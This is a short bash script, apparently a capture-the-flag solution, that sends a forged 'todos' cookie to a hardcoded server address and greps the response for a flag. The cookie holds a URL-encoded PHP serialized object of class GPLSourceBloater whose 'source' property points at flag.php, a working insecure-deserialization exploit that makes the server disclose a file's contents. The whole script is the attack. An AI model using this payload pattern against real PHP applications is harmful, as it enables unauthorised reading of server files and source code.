#!/bin/bash

URL='http://141.85.224.105:8002'

curl "$URL" -s -H 'Cookie: todos=760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D' | grep SSS
